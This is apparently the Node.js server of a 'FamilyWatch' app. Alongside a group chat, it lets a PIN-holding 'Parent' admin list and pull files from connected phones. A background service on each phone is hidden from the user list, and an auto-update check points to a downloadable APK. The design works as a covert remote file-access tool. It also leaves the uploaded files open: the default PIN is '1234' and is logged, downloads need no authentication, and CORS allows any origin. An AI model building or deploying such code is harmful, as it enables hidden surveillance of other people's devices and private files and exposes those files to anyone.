const http = require('http')
const fs   = require('fs')
const path = require('path')
const { WebSocketServer, WebSocket } = require('ws')

const ADMIN_PIN   = process.env.ADMIN_PIN || '1234'
const CLIENT_DIR  = path.join(__dirname, '../client/dist')
const APP_VERSION = process.env.APP_VERSION || '1.0.0'
const APK_URL     = `https://github.com/dailycoder09/apkformobile/releases/latest/download/meeee.apk`
const MAX_FILE_MB = 200

// In-memory file store: requestId → { data, mime, name, adminId, fromUserId }
// Auto-expires after 10 minutes
const fileStore = new Map()

const MIME = {
  '.html': 'text/html', '.js': 'application/javascript',
  '.css': 'text/css',   '.json': 'application/json',
  '.png': 'image/png',  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon', '.webmanifest': 'application/manifest+json',
}

function serveStatic(req, res) {
  try {
    const urlPath = req.url.split('?')[0]
    let filePath = path.join(CLIENT_DIR, urlPath === '/' ? 'index.html' : urlPath)

    if (!filePath.startsWith(CLIENT_DIR)) {
      res.writeHead(403); res.end('Forbidden'); return
    }

    if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
      filePath = path.join(CLIENT_DIR, 'index.html')
    }

    const ext = path.extname(filePath)
    res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' })

    const stream = fs.createReadStream(filePath)
    stream.on('error', (err) => {
      console.error('Stream error:', err.message)
      if (!res.headersSent) { res.writeHead(500); res.end('Error reading file') }
    })
    stream.pipe(res)
  } catch (err) {
    console.error('Serve error:', err.message)
    if (!res.headersSent) { res.writeHead(500); res.end('Internal Server Error') }
  }
}

const CORS = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*', 'Access-Control-Allow-Methods': 'GET,POST,OPTIONS' }

const server = http.createServer((req, res) => {
  try {
    const urlPath = req.url.split('?')[0]

    // CORS preflight
    if (req.method === 'OPTIONS') {
      res.writeHead(204, CORS); res.end(); return
    }

    // ── File upload from child device ─────────────────────────────────────
    if (req.method === 'POST' && urlPath.startsWith('/api/file/')) {
      const requestId  = urlPath.replace('/api/file/', '')
      const adminId    = req.headers['x-admin-id'] || ''
      const fromUserId = req.headers['x-user-id']  || ''
      const name       = decodeURIComponent(req.headers['x-file-name'] || 'file')
      const mime       = req.headers['content-type'] || 'application/octet-stream'

      const chunks = []
      let totalBytes = 0
      const maxBytes = MAX_FILE_MB * 1024 * 1024

      req.on('data', chunk => {
        totalBytes += chunk.length
        if (totalBytes > maxBytes) {
          req.destroy()
          res.writeHead(413); res.end(`File exceeds ${MAX_FILE_MB}MB limit`)
          return
        }
        chunks.push(chunk)
      })

      req.on('end', () => {
        const data = Buffer.concat(chunks)
        fileStore.set(requestId, { data, mime, name, adminId, fromUserId })

        // Notify the waiting admin via WebSocket
        const admin = admins.get(adminId)
        if (admin) {
          send(admin.ws, {
            type: 'file_ready',
            requestId,
            name,
            size: data.length,
            mimeType: mime,
            fromUserId,
          })
        }

        res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
        res.end(JSON.stringify({ ok: true }))

        // Auto-delete after 10 minutes to free memory
        setTimeout(() => fileStore.delete(requestId), 10 * 60 * 1000)
      })

      req.on('error', () => { res.writeHead(500); res.end('Upload error') })
      return
    }

    // ── File download for admin ───────────────────────────────────────────
    if (req.method === 'GET' && urlPath.startsWith('/api/file/')) {
      const requestId = urlPath.replace('/api/file/', '')
      const file = fileStore.get(requestId)
      if (!file) { res.writeHead(404); res.end('File not found or expired'); return }
      res.writeHead(200, {
        ...CORS,
        'Content-Type': file.mime,
        'Content-Disposition': `inline; filename="${encodeURIComponent(file.name)}"`,
        'Content-Length': file.data.length,
      })
      res.end(file.data)
      return
    }

    // Version check endpoint for auto-update
    if (urlPath === '/api/version') {
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' })
      res.end(JSON.stringify({ version: APP_VERSION, apkUrl: APK_URL }))
      return
    }

    if (fs.existsSync(CLIENT_DIR)) {
      serveStatic(req, res)
    } else {
      res.writeHead(503, { 'Content-Type': 'text/plain' })
      res.end('App not built yet. Run: npm --prefix client run build')
    }
  } catch (err) {
    console.error('Request error:', err.message)
    res.writeHead(500); res.end('Internal Server Error')
  }
})

const wss = new WebSocketServer({ server, path: '/ws' })

const admins = new Map()   // userId → { ws, userId, name }
const users  = new Map()   // userId → { ws, userId, name }
const byWs   = new Map()   // ws → meta

let idSeq = 0
function makeId() { return `${++idSeq}-${Math.random().toString(36).slice(2, 6)}` }

function send(ws, msg) {
  if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg))
}

function broadcastToAdmins(msg) {
  for (const [, m] of admins) send(m.ws, msg)
}

function broadcastAll(msg) {
  for (const [ws] of byWs) send(ws, msg)
}

function getUserList() {
  return [...users.values()]
    .filter(u => !u.isBg)
    .map(u => ({ id: u.userId, name: u.name }))
}

wss.on('connection', (ws) => {
  let meta = null

  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw)

      // ── Authentication ─────────────────────────────
      if (msg.type === 'auth') {
        if (meta) return

        const userId = makeId()

        if (msg.role === 'admin') {
          if (msg.pin !== ADMIN_PIN) {
            send(ws, { type: 'auth_fail', reason: 'Wrong PIN' })
            return
          }
          meta = { ws, role: 'admin', userId, name: 'Parent' }
          admins.set(userId, meta)
          byWs.set(ws, meta)
          send(ws, { type: 'auth_ok', role: 'admin', userId, users: getUserList() })
          return
        }

        if (msg.role === 'user') {
          const rawName = (msg.name || '').trim().slice(0, 30) || `User-${userId.split('-')[0]}`
          // Native background service appends __bg__ — strip it for display
          const isBg   = rawName.endsWith('__bg__')
          const name   = isBg ? rawName.slice(0, -6) : rawName

          if (isBg) {
            // Background service: find the existing JS session for this user
            // and link them — don't create a visible new entry
            const existing = [...users.values()].find(u => u.name === name)
            if (existing) {
              // Store bg ws on the existing meta so file requests go to native
              existing.bgWs = ws
              meta = { ws, role: 'user', userId, name, isBg: true, primaryId: existing.userId }
              byWs.set(ws, meta)
              // Give native service the same userId as the JS session
              send(ws, { type: 'auth_ok', role: 'user', userId: existing.userId, name, users: [] })
              return
            }
          }

          // Deduplicate non-bg: close old session with same name
          for (const [oldId, oldMeta] of users) {
            if (oldMeta.name === name && !oldMeta.isBg) {
              users.delete(oldId)
              byWs.delete(oldMeta.ws)
              try { oldMeta.ws.close() } catch {}
              broadcastToAdmins({ type: 'user_left', userId: oldId })
              break
            }
          }

          meta = { ws, role: 'user', userId, name, isBg: false }
          users.set(userId, meta)
          byWs.set(ws, meta)
          send(ws, { type: 'auth_ok', role: 'user', userId, name, users: getUserList() })
          broadcastToAdmins({ type: 'user_joined', user: { id: userId, name } })
          broadcastAll({ type: 'users_list', users: getUserList() })
          return
        }
      }

      if (!meta) return

      // ── Admin commands ──────────────────────────────
      if (meta.role === 'admin') {
        if (msg.type === 'ls' || msg.type === 'read_file') {
          const target = users.get(msg.targetId)
          if (target) send(target.ws, { ...msg, fromAdminId: meta.userId })
        }
        // Admin DM to a specific user
        if (msg.type === 'dm') {
          const target = [...byWs.values()].find(m => m.userId === msg.toId)
          if (target) {
            const out = { type: 'dm', text: msg.text, from: meta.name, fromId: meta.userId, toId: msg.toId, ts: Date.now() }
            send(target.ws, out)
            send(ws, { ...out, own: true })
          }
        }
        return
      }

      // ── User messages ───────────────────────────────
      if (meta.role === 'user') {
        if (['ls_result', 'file_result', 'file_start', 'file_chunk', 'file_end', 'file_error'].includes(msg.type)) {
          const admin = admins.get(msg.forAdminId)
          if (admin) send(admin.ws, { ...msg, fromUserId: meta.userId })
          return
        }
        // Group chat — broadcast to all
        if (msg.type === 'text') {
          const out = { type: 'text', text: msg.text, from: meta.name, fromId: meta.userId, ts: Date.now() }
          send(ws, { ...out, own: true })
          for (const [client] of byWs) {
            if (client !== ws) send(client, out)
          }
        }
        // Direct message — send to specific user only
        if (msg.type === 'dm') {
          const target = [...byWs.values()].find(m => m.userId === msg.toId)
          if (target) {
            const out = { type: 'dm', text: msg.text, from: meta.name, fromId: meta.userId, toId: msg.toId, ts: Date.now() }
            send(target.ws, out)
            send(ws, { ...out, own: true })
          }
        }
      }

    } catch (e) {
      console.error('parse error:', e.message)
    }
  })

  ws.on('close', () => {
    if (!meta) return
    byWs.delete(ws)
    if (meta.role === 'admin') {
      admins.delete(meta.userId)
    } else if (meta.isBg) {
      // Background session closed — remove bgWs reference from primary session
      const primary = [...users.values()].find(u => u.userId === meta.primaryId)
      if (primary) delete primary.bgWs
    } else {
      users.delete(meta.userId)
      broadcastToAdmins({ type: 'user_left', userId: meta.userId })
      broadcastAll({ type: 'users_list', users: getUserList() })
    }
  })

  ws.on('error', (e) => console.error('ws error:', e.message))
})

const PORT = process.env.PORT || 3001
server.on('error', (e) => {
  if (e.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} busy — run: lsof -ti :${PORT} | xargs kill -9`)
    process.exit(1)
  }
})
server.listen(PORT, () => {
  console.log(`\n🚀 FamilyWatch running on port ${PORT}`)
  console.log(`   App:       http://localhost:${PORT}`)
  console.log(`   WebSocket: ws://localhost:${PORT}/ws`)
  console.log(`   Admin PIN: ${ADMIN_PIN}`)
  console.log(`   Dist:      ${fs.existsSync(CLIENT_DIR) ? '✓ found' : '✗ MISSING — run: npm --prefix client run build'}\n`)
})
